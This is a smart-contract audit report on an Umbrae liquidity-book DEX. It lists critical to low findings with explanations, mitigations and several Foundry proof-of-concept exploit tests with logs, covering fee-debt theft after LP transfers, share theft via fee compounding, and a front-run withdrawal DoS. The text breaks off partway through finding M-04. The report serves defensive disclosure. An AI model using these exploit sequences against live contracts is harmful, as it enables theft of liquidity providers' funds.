# Ignite Labs
Ignite Labs Audit || Dec 2025

## Finding Summary
|ID|Title|Severity|
|:-:|:---|:------:|
|[C-01](#c-01-fee-debt-not-updated-during-lp-token-transfers-allowing-historical-claims)|Fee Debt Not Updated During LP Token Transfers Allowing Historical Claims|CRITICAL|
|[C-02](#c-02-when-compounding-lp-fees-user-could-steal-additional-assets)|When compounding LP fees user could steal additional assets|CRITICAL|
|[C-03](#c-03-dos-attack---attacker-can-shift-the-activeid-bin-to-very-large-value)|DoS Attack - Attacker can shift the activeID bin to very large value|CRITICAL|
|[H-01](#h-01-an-attacker-can-dos-liquidity-withdrawal-for-another-user-via-lptokenholder-with-just-1-lp-token)|An attacker can DOS liquidity withdrawal for another user via LpTokenHolder with just 1 Lp token|HIGH|
|[H-02](#h-02-lp-fees-for-multi-bin-swaps-are-distributed-unfairly)|LP fees for multi bin swaps are distributed unfairly|HIGH|
|[H-03](#h-03-compoundlpfees-breaks-bin-reserve-accounting)|compoundLPFees() Breaks Bin Reserve Accounting|HIGH|
|[M-01](#m-01-swaptokensforexacttokens-reverts-on-multi-hop-paths-due-to-hardcoded-fee-calculation-in-_getamountin-leading-to-dos)|swapTokensForExactTokens reverts on multi-hop paths due to hardcoded fee calculation in _getAmountIn leading to DOS|MEDIUM|
|[M-02](#m-02-sqrt-scaling-bug-causes-il-calculator-to-report-100-loss-for-any-price-movement-in-ilcalculatorsol)|Sqrt Scaling Bug Causes IL Calculator to Report 100% Loss for Any Price Movement in ILCalculator.sol|MEDIUM|
|[M-03](#m-03-uniswapv3priceoraclegettwap-uses-spot-price-instead-of-twap)|UniswapV3PriceOracle::_getTWAP() Uses Spot Price Instead of TWAP|MEDIUM|
|[M-04](#m-04-inaccurate-swap-quote-for-large-swaps-in-getdetailedswapquote)|Inaccurate Swap Quote for Large Swaps in getDetailedSwapQuote|MEDIUM|
|[M-05](#m-05-swapquoteresulttotalfee-does-not-contain-correct-totalfee-value)|SwapQuoteResult.totalFee does not contain correct totalFee value|MEDIUM|
|[M-06](#m-06-_calculateswapquote-function-uses-incorrect-fee-calculation-due-to-bad-formula)|_calculateSwapQuote function uses incorrect fee calculation due to bad formula|MEDIUM|
|[M-07](#m-07-swap-dos-due-to-empty-bin-traversal-in-_performswap)|Swap DOS Due to Empty Bin Traversal in _performSwap|MEDIUM|
|[L-01](#l-01-router_getpricefromownpair-hardcodes-binstep25-causing-incorrect-bin-and-price-calculations-for-non-25-binstep-pairs)|Router:_getPriceFromOwnPair hardcodes binStep=25 causing incorrect bin and price calculations for non-25 binStep pairs|LOW|
|[L-02](#l-02-oracle-updated-but-not-readable---dead-code-wastes-gas)|Oracle Updated But Not Readable - Dead Code Wastes Gas|LOW|
|[L-03](#l-03-wrong-implementation-in-finding-uniswapv3-pool)|Wrong implementation in finding uniswapV3 pool|LOW|
|[L-04](#l-04-hardcoded-25bp-bin-step-causes-wrong-calculations)|Hardcoded 25bp Bin Step causes Wrong Calculations|LOW|
|[L-05](#l-05-users-could-artificially-increase-the-volatility-fee-by-executing-small-swaps)|Users could artificially increase the volatility fee by executing small swaps|LOW|

----

## [C-01] Fee Debt Not Updated During LP Token Transfers Allowing Historical Claims

### Summary
When LP tokens are transferred via safeTransferFrom(), the _userDebt mapping that tracks already claimed fees is not updated. This breaks the fee accounting system

Recipients can claim historical fees which they are not eligible for
Also senders debt remains unchanged, reducing their claimable amount post-transfer
This attack can be repeated multiple times to drain the protocol reserves

### Root Cause
_transfer only updates _balances. It never updates _userDebt state variable

UmbraeLBToken::_transfer()

### Impact
Funds can be drained from the protocol reserves

### POC

```solidity
forge test --mt "testExploit_SingleRecipientHistoricalClaim" -vv

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/UmbraeLBFactory.sol";
import "../src/UmbraeLBPair.sol";
import "../src/UmbraeLBRouter.sol";
import "./RouterLPTokenBurning.t.sol"; // Import SimpleToken
import {console} from "forge-std/console.sol";

contract ExploitLPFeeHistoricalClaim is Test {
    UmbraeLBFactory factory;
    UmbraeLBRouter router;
    UmbraeLBPair pair;
    SimpleToken tokenX;
    SimpleToken tokenY;

    address alice = address(0xa11ce);
    address bob = address(0xb0b);
    address trader = address(0xdead);

    uint24 constant ACTIVE_BIN_ID = 8388608;
    uint16 constant BIN_STEP = 25;

    function setUp() public {
        // Create tokens (ensure tokenX < tokenY)
        bytes32 salt0 = bytes32(uint256(1));
        bytes32 salt1 = bytes32(uint256(2));

        tokenX = new SimpleToken{salt: salt0}("TokenX", "TKX");
        tokenY = new SimpleToken{salt: salt1}("TokenY", "TKY");

        if (address(tokenX) > address(tokenY)) {
            (tokenX, tokenY) = (tokenY, tokenX);
        }

        factory = new UmbraeLBFactory(address(this));
        router = new UmbraeLBRouter(address(factory), address(0));

        address pairAddr = factory.createPair(
            address(tokenX),
            address(tokenY),
            ACTIVE_BIN_ID,
            BIN_STEP
        );
        pair = UmbraeLBPair(pairAddr);

        // Setup initial liquidity
        _addInitialLiquidityBob();
    }

    function _addInitialLiquidityAlice() internal {
        vm.startPrank(alice);

        tokenX.mint(alice, 1_000_000e18);
        tokenY.mint(alice, 1_000_000e18);
        tokenX.approve(address(router), type(uint256).max);
        tokenY.approve(address(router), type(uint256).max);

        int256[] memory deltaIds = new int256[](1);
        deltaIds[0] = 0;

        uint256[] memory distributionX = new uint256[](1);
        uint256[] memory distributionY = new uint256[](1);
        distributionX[0] = 1e18;
        distributionY[0] = 1e18;

        router.addLiquidity(
            address(tokenX),
            address(tokenY),
            BIN_STEP,
            500_000e18, // 500k liquidity
            500_000e18,
            0,
            0,
            ACTIVE_BIN_ID,
            0,
            deltaIds,
            distributionX,
            distributionY,
            alice,
            block.timestamp + 1000
        );

        vm.stopPrank();
    }

    function _addInitialLiquidityBob() internal {
        vm.startPrank(bob);

        tokenX.mint(bob, 1_000_000e18);
        tokenY.mint(bob, 1_000_000e18);
        tokenX.approve(address(router), type(uint256).max);
        tokenY.approve(address(router), type(uint256).max);

        int256[] memory deltaIds = new int256[](1);
        deltaIds[0] = 0;

        uint256[] memory distributionX = new uint256[](1);
        uint256[] memory distributionY = new uint256[](1);
        distributionX[0] = 1e18;
        distributionY[0] = 1e18;

        router.addLiquidity(
            address(tokenX),
            address(tokenY),
            BIN_STEP,
            500_000e18, // 500k liquidity
            500_000e18,
            0,
            0,
            ACTIVE_BIN_ID,
            0,
            deltaIds,
            distributionX,
            distributionY,
            bob,
            block.timestamp + 1000
        );

        vm.stopPrank();
    }

    function _executeSwap(uint256 amountIn) internal {
        vm.startPrank(trader);

        tokenX.mint(trader, amountIn * 2);
        tokenY.mint(trader, amountIn * 2);

        tokenX.approve(address(router), type(uint256).max);
        tokenY.approve(address(router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(tokenX);
        path[1] = address(tokenY);

        uint16[] memory binSteps = new uint16[](1);
        binSteps[0] = BIN_STEP;

        router.swapExactTokensForTokens(
            amountIn,
            0,
            path,
            binSteps,
            trader,
            block.timestamp + 1000
        );

        vm.stopPrank();
    }

    function testExploit_SingleRecipientHistoricalClaim() public {
        // 1) generate fees
        _executeSwap(50_000e18);
        (uint256 bobFeesX, ) = pair.getClaimableFees(bob, ACTIVE_BIN_ID);
        console.log("bob fees accrued :", bobFeesX / 1e18);

        _addInitialLiquidityAlice();

        _executeSwap(50_000e18);

        (uint256 aliceFeesX, ) = pair.getClaimableFees(alice, ACTIVE_BIN_ID);
        require(aliceFeesX > 0, "no fees generated");
        console.log("aliceFeesX:", aliceFeesX / 1e18);

        // 2) prepare recipient and transfer a chunk of LP
        address recipient = address(uint160(0x2000));
        uint256 aliceLP = pair.balanceOf(alice, ACTIVE_BIN_ID);
        console.log("Alice has ", aliceLP / 1e18, "LP's");

        uint256 transferAmount = aliceLP;
        vm.prank(alice);
        pair.safeTransferFrom(alice, recipient, ACTIVE_BIN_ID, transferAmount);
        console.log("Transferred", transferAmount / 1e18, "LP to recipient");

        // 3) check claimable immediately after transfer
        (uint256 recipientFeesX, ) = pair.getClaimableFees(
            recipient,
            ACTIVE_BIN_ID
        );
        console.log("recipientClaimX:", recipientFeesX / 1e18);
        console.log(
            "As we could see recepient can claiming historical fees as well which neither alice or reciepient are eligible for!"
        );
        //@audit - receipient can claim historical fees as well as Debt tracking for receipient is not updated accordingly during transfer
        vm.prank(recipient);
        (uint256 recipientFeesX_Received, ) = pair.claimLPFees(
            ACTIVE_BIN_ID,
            recipient
        );
        assertTrue(
            recipientFeesX_Received > aliceFeesX,
            "functionality working as expected"
        );
    }
}
```

**Logs:**
```
bob fees accrued : 134
aliceFeesX: 67
Alice has  1000000 LP's
Transferred 1000000 LP to recipient
recipientClaimX: 201
As we could see recepient can claiming historical fees as well which neither alice or reciepient are eligible for!

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.32ms (484.23µs CPU time)

Ran 1 test suite in 7.28ms (2.32ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommended Mitigation
Override _transfer() to update debt properly for both sender and receiver

---

## [C-02] When compounding LP fees user could steal additional assets

### Description
The compoundLPFee() function allows malicious users (that have earned lp fee), to steal liquidity from other users within the bin. By compounding lp fee, the additionally added liquidity gets added to the reservesX/Y, also the liquidity gets minted to user, but the bin.totalShares doesn't get updated, this oversight allows malicious user to withdraw (burn) more liquidity than it owns, effectively stealing from other users.

### Example

The user1 has the full liquidity of bin 8 388 608 (for simplicity):

```
Bin 8 388 608:
- reserveX: 5000 1e18
- reserveY: 5000 1e18
- totalShares: 10 000 1e18
- balanceOf(user1) = 10 000 1e18
```

So far there are 200 1e18 accumulated fees of tokenX, and 400 1e18 accumulated fees of tokenY.

Now user1 calls `compoundLPFees` function to compound:
- claimableX is 200 1e18
- claimableY is 400 1e18
- liquidityMinted is 600 1e18

The bin gets updated so the next state is:

```
Bin 8 388 608:
- reserveX: 5200 1e18
- reserveY: 5400 1e18
- totalShares: 10 000 1e18 (NOT UPDATED!)
- balanceOf(user1) = 10 600 1e18
```

But since user1 has been minted with 600 1e18 shares due to compounding, he holds 10 600 1e18 shares (and bin.totalShares hasn't been updated).

Now he withdraws 10 000 1e18 of his shares (has to do it like that since there is a check in removeLiquidity against the bin.totalShares which are 10 000 1e18 in this case):
- He receives: 5200 1e18 tokenX and 5400 1e18 tokenY
- Still has 600 1e18 shares (that were minted during the compounding)

Current state of the bin:

```
Bin 8 388 608:
- reserveX: 0
- reserveY: 0
- totalShares: 0
- balanceOf(user1) = 600 1e18
```

Now user1 waits for user2 to mint liquidity to this bin (if user2 was already in the bin, from the first call, user1 wouldn't have to wait for him, this scenario in this example is just for simplicity).

After user2 has minted 2000 1e18 the bin looks like this:

```
Bin 8 388 608:
- reserveX: 1000 1e18
- reserveY: 1000 1e18
- totalShares: 2000 1e18
- balanceOf(user1) = 600 1e18
- balanceOf(user2) = 2000 1e18
```

Now user1 is able to burn his remaining 600 1e18 shares:
- user1 receives: 300 1e18 tokenX and 300 1e18 tokenY
- **User successfully steals additional tokens from other user.**

### Impact
Users who compound LP fees, are able to steal additional funds from other users from the same bin.

### Mitigation
Consider adding newly minted shares to the totalSupply of the bin.

---

## [C-03] DoS Attack - Attacker can shift the activeID bin to very large value

### Description

```solidity
function _performSwap(
    bool swapForY,
    uint256 amountIn,
    address to
) internal returns (uint256 amountOut, uint256 binsTraversed) {
    uint24 startBinId = _activeId;
    uint24 currentBinId = startBinId;

    // Normalize input to 18 decimals for calculations
    uint256 amountInNormalized = _scaleUp(amountIn, swapForY);
    uint256 amountInLeftNormalized = amountInNormalized;
    uint256 amountOutNormalized;
>>> uint256 maxBinsToTraverse = 100; // Safety limit to prevent infinite loops
```

This function is used to perform swap, and if the activeID bin is not having enough liquidity it traverse to another bin to get tokens, but the issue here is that it blindly incrementing the binID, instead of getting the active binID, like how uniswapV3 get the next active tick to perform swap. Because of which attacker can shift the activeID bin to very large value making users not able to trade at the current price, because even if they try to trade the transaction get reverted because to happen, activeID bin should move more than 100 bins.

E.g., Admin created a pool intending for stable coin swap, which means trade mostly happens around $1. Now attacker back runs the transaction by providing LP with 1 Wei liquidity at every 99 bin from the $1 for many many times. Finally performs swaps for that much amount of liquidity, as the amount is low, fee will be zero, so no point in talking about it. So, when swap happens from activeID bin, i.e., at $1, it checks for liquidity, and so traverses and at bin 99 it will find liquidity and get swapped. Same thing happens again in a loop shifting the price to very large value, let's say $20. Now user removes all the liquidity.

Now legit LP's comes in and provides liquidity at the $1 bin, and those liquidity simply sit there without getting traded, as activeID bin is very far from $1 bin. This can be revert back only when another user re performs the same operation as attacker, which is very difficult as legit LP's already added liquidity at this point of time.

Recommended to remove 100 bin safety limit, as gas cost in Base is not that expensive compared to Mainnet, now it is also very low after fusaka upgrade. Want to recommend same as #20 report says, instead of fetching the next bin, try to fetch next active bin

---

## [H-01] An attacker can DOS liquidity withdrawal for another user via LpTokenHolder with just 1 Lp token

### Description
An attacker can prevent legitimate users from withdrawing their liquidity by front-running their burn() transaction and donating a dust amount of LP tokens to the pair contract. This causes the victim's withdrawal to revert, temporarily locking their funds.

### Root cause
The _removeLiquidity() function determines the LP token holder by checking only the first bin's balance at address(this):

```solidity
address lpTokenHolder = balanceOf(address(this), ids.length > 0 ? ids[0].safe24() : 0) > 0
    ? address(this)
    : msg.sender;
```

This single-bin check is then applied to ALL bins in the withdrawal request. If an attacker donates even 1 LP token for the first bin to the pair contract, the function incorrectly assumes all LP tokens should be burned from the pair, not from the user's wallet.

### Attack scenario
Alice (victim) holds LP tokens in bins [8388608, 8388609] in her wallet
Bob (attacker) holds a small amount of LP tokens in bin 8388608

**Step-by-Step Attack:**

1. Alice submits a transaction to withdraw liquidity: burn([8388608, 8388609], [50e18, 50e18], alice)
2. Bob sees Alice's pending transaction in the mempool
3. Bob front-runs with: safeTransferFrom(bob, pair, 8388608, 1) - donating just 1 LP token to the pair contract
4. Alice's transaction executes:
   - lpTokenHolder = balanceOf(pair, 8388608) > 0 evaluates to 1 > 0 = TRUE
   - Therefore lpTokenHolder = address(pair) instead of alice
   - The loop checks: balanceOf(pair, 8388608) >= 50e18 → 1 >= 50e18 → FALSE
   - Transaction reverts with LBPair__InsufficientLiquidity
5. Alice's withdrawal fails; her funds remain locked

**Result:**
- Alice cannot withdraw her liquidity
- Cost to attacker: Gas + 1 LP token (dust amount)

### Impact
Legitimate users cannot withdraw their liquidity

### POC

```solidity
function test_POC_DoS_lpTokenHolderManipulation() public {
    // SETUP: Alice adds liquidity to multiple bins
    uint256 amount = 100_000e18;
    
    token0.mint(alice, amount * 4);
    token1.mint(alice, amount * 4);
    token0.mint(bob, amount * 2);
    token1.mint(bob, amount * 2);
    
    // Alice adds liquidity to TWO bins
    vm.startPrank(alice);
    token0.transfer(address(pair), amount);
    token1.transfer(address(pair), amount);
    
    uint256[] memory ids = new uint256[](2);
    uint256[] memory amounts = new uint256[](2);
    ids[0] = ACTIVE_BIN_ID;
    ids[1] = ACTIVE_BIN_ID + 1;
    amounts[0] = amount * 2;
    amounts[1] = amount;
    
    if (address(pairTokenY) == address(token0)) {
        token0.transfer(address(pair), amount);
    } else {
        token1.transfer(address(pair), amount);
    }
    
    pair.mint(ids, amounts, alice);
    vm.stopPrank();
    
    // Bob gets minimal LP tokens
    vm.startPrank(bob);
    token0.transfer(address(pair), 100);
    token1.transfer(address(pair), 100);
    
    uint256[] memory bobIds = new uint256[](1);
    uint256[] memory bobAmounts = new uint256[](1);
    bobIds[0] = ACTIVE_BIN_ID;
    bobAmounts[0] = 200;
    
    pair.mint(bobIds, bobAmounts, bob);
    vm.stopPrank();
    
    // ATTACK: Bob donates 1 LP token to pair contract
    vm.startPrank(bob);
    pair.safeTransferFrom(bob, address(pair), ACTIVE_BIN_ID, 1);
    vm.stopPrank();
    
    // VICTIM: Alice tries to withdraw
    uint256[] memory burnIds = new uint256[](2);
    uint256[] memory burnAmounts = new uint256[](2);
    burnIds[0] = ACTIVE_BIN_ID;
    burnIds[1] = ACTIVE_BIN_ID + 1;
    burnAmounts[0] = 50e18;
    burnAmounts[1] = 50e18;
    
    vm.startPrank(alice);
    
    // ATTACK SUCCESS: Transaction reverts
    vm.expectRevert(IUmbraeLBPair.LBPair__InsufficientLiquidity.selector);
    pair.burn(burnIds, burnAmounts, alice);
    
    vm.stopPrank();
}
```

### Mitigation
Check the LP token holder for each bin individually

---

## [H-02] LP fees for multi bin swaps are distributed unfairly

### Description
When executing large swaps, that require the shifting of the activeBin (multi bin swaps), the last used bin (that now is the activeBin) gets the full lpFee amount, even though the liquidity from previous bins was used during the swap. That effectively mean that LP from previous bins that provided the liquidity and whose liquidity was used during the swap, do not get any award for that.

The issue arises because of the _updateBinFees function, that is called on the end of the swap, is giving the full LpFee amount to only one bin, without considering other activeBin (not active anymore, they were active during the swap) and how much liquidity they have contributed to the swap.

### Example

(For simplicity, no protocol fee and volatilityFee)

**Initial State:**

```
activeBin - 666:
- reserveX: 1000 * 1e18
- reserveY: 1000 * 1e18
- totalShares: 2000 * 1e18

otherBin - 665:
- reserveX: 1000 * 1e18
- reserveY: 0
- totalShares: 1000 * 1e18
```

User calls swap function and sends 1500 * 1e18 tokenY (after 10% fee, the amountYIn is 1364 * 1e18 and the LpFee is 136 * 1e18, the swapForY flag is false).

**After swap in active bin (666):**

startBin is the current active bin (666), after performing the swap in that active bin the state is:

```
activeBin - 666:
- reserveX: 0
- reserveY: 2000 * 1e18
- totalShares: 2000 * 1e18
```

amountInLeft is 364, so we go to the next bin and perform the swap.

**After swap in next bin (665):**

```
otherBin - 665:
- reserveX: 636 * 1e18
- reserveY: 364 * 1e18
- totalShares: 1000 * 1e18
```

Since we have moved to the next bin, bin 665 now becomes the active bin.

**The Bug:**

Now `_updateBinFees` is called with the full LpFee amount (136 * 1e18) and new active bin (665), so the LP from that bin gets the **full fee**, even though the liquidity from bin 666 was also used in the swap.

### Impact
Liquidity providers from startBin up until newActiveBin-1, do not get any LP fees earned during the multi bin swap.

### Mitigation
Consider changing up the fee accrual logic, so the LPs from all of the traversed bins get their share of the LP fees.

---

## [H-03] compoundLPFees() Breaks Bin Reserve Accounting

### Summary
The compoundLPFees() function lets users deposit both tokens (X and Y) into any bin, even bins that are supposed to hold only one token breaking the current protocol invariant which follows below pattern

Below active price: only token X
Above active price: only token Y
At active price: mix of X + Y

### Root Cause

Normal `addLiquidity()` enforces this rule properly but `compoundLPFees()` ignores it completely as it blindly adds both X and Y to any bin making it imbalanced.

**When a user compounds LP fees:**

1. The contract reads claimable fees in token X and token Y
2. It adds both values together (X + Y) to compute contributed liquidity
3. LP shares are minted based on this summed value
4. The reserves are updated and LP tokens minted
5. User later burns LP tokens and walks away with additional tokens for free - for example burn gives back equal tokens of X and Y (valuable tokens) once their LP tokens are burned but `compoundLPFees()` added only X tokens (cheap tokens)

**File:** `UmbraeLBPair::compoundLPFees()`

### Recommendation
Make compoundLPFees() behave like addLiquidity() - use LiquidityCalculator to split the fees correctly

---

## [M-01] swapTokensForExactTokens reverts on multi-hop paths due to hardcoded fee calculation in _getAmountIn leading to DOS

### Description
The swapTokensForExactTokens function supports multi-hop swaps (e.g., A → B → C → D), but the internal _getAmountIn function uses a hardcoded 0.3% fee that ignores the number of hops. This causes all multi-hop "exact output" swaps to revert because the calculated input amount is always insufficient.

### Root Cause
Location: UmbraeLBRouter._getAmountIn() (lines 274-282)
The function accepts path and binSteps parameters but completely ignores them:

```solidity
function _getAmountIn(
    uint256 amountOut, 
    address[] memory /* path */,      // IGNORED - should iterate hops
    uint16[] memory /* binSteps */    // IGNORED - should account for fees per hop
) internal pure returns (uint256 amountIn) {
    // Simplified - production would use quote functions
    amountIn = (amountOut * 10030) / 10000; // 0.3% fee - HARDCODED for ALL paths
}
```

The function is called by swapTokensForExactTokens, which does support multi-hop paths:

```solidity
function swapTokensForExactTokens(
    uint256 amountOut,
    uint256 amountInMax,
    address[] memory path,      // Can be [A, B, C, D] for multi-hop
    uint16[] memory binSteps,   // One binStep per hop
    address to,
    uint256 deadline
) external ensure(deadline) returns (uint256 amountIn) {
    if (path.length < 2) revert LBRouter__InvalidPath();
    if (path.length - 1 != binSteps.length) revert LBRouter__InvalidPath();
    
    // BUG: _getAmountIn ignores path.length
    amountIn = _getAmountIn(amountOut, path, binSteps);
    
    // Transfer the (insufficient) calculated amount
    _safeTransferFromVerified(IERC20(path[0]), msg.sender, ..., amountIn);
    
    // Execute multi-hop swap
    _swap(path, binSteps, to);  // This correctly handles multi-hop
    
    // Check output - THIS REVERTS because input was insufficient
    if (actualAmountOut < amountOut) revert LBRouter__InsufficientAmountOut();
}
```

### Impact
DoS on Multi-Hop Swaps: swapTokensForExactTokens always reverts for paths with 2+ hops

### Proof of Concept
Add this import in RouterSecurity.t.sol.

```solidity
import "../src/libraries/BinHelper.sol";
```

Then this poc

```solidity
function test_POC_Issue_GetAmountInDoS_MultiHop() public {
    // BUG: _getAmountIn uses hardcoded 0.3% fee, ignoring:
    // - Multi-hop fee stacking (each hop charges fees)
    // - Volatility fees
    // - Slippage
    // This causes swapTokensForExactTokens to REVERT on multi-hop paths
    
    MockToken tokenC = new MockToken("Token C", "TKC");
    
    // Get actual token ordering for pairs
    IERC20 actualTokenB = IERC20(pair.tokenY());
    MockToken tokenBActual = MockToken(address(actualTokenB));

    MockToken token0BC = tokenBActual;
    MockToken token1BC = tokenC;
    if (address(token0BC) > address(token1BC)) {
        (token0BC, token1BC) = (token1BC, token0BC);
    }

    // Create B-C pair
    address pairBC = factory.createPair(address(token0BC), address(token1BC), ACTIVE_BIN_ID, BIN_STEP);

    // Add liquidity to B-C pair
    uint256 liquidity = 100_000e18;
    IERC20 tokenXBC = IERC20(UmbraeLBPair(pairBC).tokenX());
    IERC20 tokenYBC = IERC20(UmbraeLBPair(pairBC).tokenY());

    MockToken(address(tokenXBC)).mint(lp, liquidity);
    MockToken(address(tokenYBC)).mint(lp, liquidity);

    vm.startPrank(lp);
    tokenXBC.transfer(pairBC, liquidity / 2);
    tokenYBC.transfer(pairBC, liquidity / 2);

    uint256[] memory ids = new uint256[](1);
    uint256[] memory amounts = new uint256[](1);
    ids[0] = ACTIVE_BIN_ID;
    amounts[0] = liquidity;
    UmbraeLBPair(pairBC).mint(ids, amounts, lp);
    vm.stopPrank();

    // User wants EXACTLY 5000 tokens C via multi-hop A -> B -> C
    uint256 desiredExactOutput = 5_000e18;
    
    // User is willing to pay up to 10,000 tokens A (generous max)
    uint256 maxInput = 10_000e18;

    MockToken startToken = MockToken(address(pair.tokenX()));
    startToken.mint(user, maxInput);

    vm.startPrank(user);
    startToken.approve(address(router), maxInput);

    address[] memory path = new address[](3);
    path[0] = address(startToken);
    path[1] = address(tokenBActual);
    path[2] = address(tokenC);

    uint16[] memory binSteps = new uint16[](2);
    binSteps[0] = BIN_STEP;
    binSteps[1] = BIN_STEP;

    // THE BUG:
    // _getAmountIn calculates: 5000 * 10030 / 10000 = 5015 tokens A (only 0.3% buffer)
    // But multi-hop needs MORE because:
    //   Hop 1 (A->B): 5015 - 0.3% fee = ~5000 B
    //   Hop 2 (B->C): 5000 - 0.3% fee = ~4985 C
    // User gets ~4985 C but wanted EXACTLY 5000 C
    // Transaction REVERTS with LBRouter__InsufficientAmountOut
    
    // Even though user is willing to pay up to 10,000 A,
    // _getAmountIn only transfers 5015 A, which is insufficient
    
    vm.expectRevert(UmbraeLBRouter.LBRouter__InsufficientAmountOut.selector);
    router.swapTokensForExactTokens(
        desiredExactOutput,  // User wants EXACTLY 5000 C
        maxInput,            // User willing to pay up to 10,000 A
        path,
        binSteps,
        user,
        block.timestamp + 1000
    );

    vm.stopPrank();
    
    // IMPACT: swapTokensForExactTokens is broken for multi-hop paths
    // Users cannot use "exact output" swaps even with generous maxInput
}
```

### Recommendation
Calculate input iteratively for each hop in the path

---

## [M-02] Sqrt Scaling Bug Causes IL Calculator to Report 100% Loss for Any Price Movement in ILCalculator.sol

### Description
The calculateIL() function in ILCalculator.sol computes impermanent loss using the standard IL formula: IL = 2 * sqrt(r) / (1 + r) - 1.

However, when calling the sqrt() function on a 1e18-scaled number, the result is returned in 1e9 scale (since sqrt halves the decimal places).

The code fails to restore the 1e18 scale after the sqrt operation, causing all subsequent calculations to be off by a factor of 1 billion.
This results in the IL calculation reporting approximately -9999 basis points (-99.99% loss) for ANY price movement, regardless of actual magnitude.

### Root Cause
In ILCalculator.sol, the calculateIL() function:

```solidity
function calculateIL(uint256 initialPriceRatio, uint256 currentPriceRatio)
    internal pure returns (int256 ilPercentage)
{
    // priceRatio is 1e18 scaled (e.g., 2e18 represents 2.0)
    uint256 priceRatio = (currentPriceRatio * 1e18) / initialPriceRatio;

    // BUG: sqrt(2e18) = 1.414e9, NOT 1.414e18
    // sqrt halves the decimal places: sqrt(1e18) = 1e9
    uint256 sqrtRatio = sqrt(priceRatio);  // Returns 1e9 scale

    // Code assumes sqrtRatio is 1e18 scale
    uint256 numerator = 2 * sqrtRatio;              // 2.828e9
    uint256 denominator = 1e18 + priceRatio;        // 3e18
    uint256 ratio = (numerator * 1e18) / denominator; // 0.9428e9 (should be 0.9428e18)

    // Comparison expects 1e18 scale
    if (ratio >= 1e18) {
        ilPercentage = 0;
    } else {
        // (1e18 - 0.9428e9) ≈ 1e18, so loss ≈ 9999 basis points
        uint256 loss = ((1e18 - ratio) * 10000) / 1e18;
        ilPercentage = -int256(loss);  // Reports -9999 (99.99% loss)
    }
}
```

The sqrt() function correctly computes the mathematical square root. For input 2e18:
sqrt(2 × 10^18) = sqrt(2) × sqrt(10^18) = 1.414 × 10^9 = 1.414e9.
The code never multiplies by 1e9 to restore the expected 1e18 scale.

### Impact
Any call to calculatePositionIL() returns approximately -99.99% IL regardless of actual price movement.
The calculatePositionHealth() function receives the wrong IL value, causing all positions to show as "unhealthy" (score ~50 instead of ~95).

### Proof of Concept
Add to test/AnalyticsFeatures.t.sol:

```solidity
function test_POC_SqrtScalingBugInILCalculation() public {
    // Setup: Add liquidity at the active bin (entry point)
    _addLiquidityToActiveBin(alice, 100 ether, 100 ether);
    
    uint24 entryBinId = ACTIVE_ID;
    
    // Simulate price movement by doing swaps
    vm.startPrank(bob);
    tokenA.approve(address(pair), 50 ether);
    tokenA.transfer(address(pair), 50 ether);
    pair.swap(true, bob);
    vm.stopPrank();
    
    // Prepare bin IDs for IL calculation
    uint24[] memory binIds = new uint24[](1);
    binIds[0] = ACTIVE_ID;
    
    // Call calculatePositionIL
    (int256 totalILPercentage, uint256 inRangePercentage, uint8 healthScore) = 
        pair.calculatePositionIL(alice, binIds, entryBinId);
    
    // BUG: IL reports >90% loss due to sqrt scaling issue
    // Expected: ~-200 to -500 bps for a 50% reserve swap
    // Actual: -9999 bps (99.99% loss)
    assertTrue(
        totalILPercentage < -9000, 
        "BUG CONFIRMED: IL reports >90% loss due to sqrt scaling issue"
    );
    
    // Health score incorrectly shows unhealthy position
    assertTrue(
        healthScore < 60,
        "BUG CONFIRMED: Health score incorrectly shows unhealthy position"
    );
    
    inRangePercentage; // Suppress warning
}
```

Test outputs:
```
calculatePositionIL returned: (-9999, 10000, 50)

totalILPercentage = -9999  (reports 99.99% loss - WRONG)
healthScore = 50           (shows unhealthy - WRONG)
```

### Mitigation
In ILCalculator.sol, multiply the sqrt result by 1e9 to restore 1e18 scale:

```solidity
// Before (buggy):
uint256 sqrtRatio = sqrt(priceRatio);

// After (fixed):
uint256 sqrtRatio = sqrt(priceRatio) * 1e9;
```

---

## [M-03] UniswapV3PriceOracle::_getTWAP() Uses Spot Price Instead of TWAP

### Summary
Currently the UniswapV3PriceOracle contract returns spot prices instead of time-weighted average prices (TWAP). This needs to be fixed before deploying into the mainnet as spot price can be manipulable easily

### Root Cause
The oracle currently reads prices directly from slot0() instead of using observe() or consult() to compute a TWAP. Although comments explicitly state that a proper TWAP should be implemented, this was never completed, leaving the oracle to return a manipulable spot price

```solidity
function _getTWAP(address pool, uint32 period) internal view returns (uint256 price) {
    //..
    (bool success, bytes memory data) = pool.staticcall(abi.encodeWithSignature("slot0()"));
    if (!success) return 0;

    (uint160 sqrtPriceX96,,,,,,) = abi.decode(data, (uint160, int24, uint16, uint16, uint16, uint8, bool));

    //@> Returns SPOT price, not TWAP
    uint256 priceX192 = uint256(sqrtPriceX96) * uint256(sqrtPriceX96);
}
```

### Recommended Mitigation
Implement Proper TWAP using libraries from Uniswap. Here is sample implementation

```solidity
/// @dev returns quoteAmount of `quoteToken` for `baseAmount` of `baseToken` using TWAP over `period` seconds
function getTWAPQuote(
    address pool,
    uint32 period,            // e.g. 300 for 5 minutes
    uint128 baseAmount,       // amount of baseToken to quote
    address baseToken,        // token to be quoted (can be pool.token0() or token1())
    address quoteToken
) public view returns (uint256 quoteAmount) {
    require(period > 0, "period>0");
    require(baseAmount > 0, "baseAmt>0");

    // OracleLibrary.consult does the observe() call and arithmetic-mean tick calc correctly
    (int24 arithmeticMeanTick, ) = OracleLibrary.consult(pool, period);

    // Convert tick -> quote for baseAmount and token ordering
    quoteAmount = OracleLibrary.getQuoteAtTick(
        arithmeticMeanTick,
        baseAmount,
        baseToken,
        quoteToken
    );
}
```

---

## [M-04] Inaccurate Swap Quote for Large Swaps in getDetailedSwapQuote

### Description
The getDetailedSwapQuote function in UmbraeLBRouter only reads reserves from the active bin when calculating swap quotes. This bug only manifests when the swap amount exceeds the active bin's liquidity, requiring bin traversal. For small swaps contained within the active bin, quotes are reasonably accurate. However, for large swaps that would traverse multiple bins in actual execution, the function reports drastically inflated price impact (up to 300x higher) and underestimated output amounts (up to 11x lower).

Condition for bug to trigger:
swapAmount > activeBinLiquidity

When this condition is true, actual swaps traverse adjacent bins but the quote only calculates using the active bin's limited reserves.

### Root cause
Function: getDetailedSwapQuote
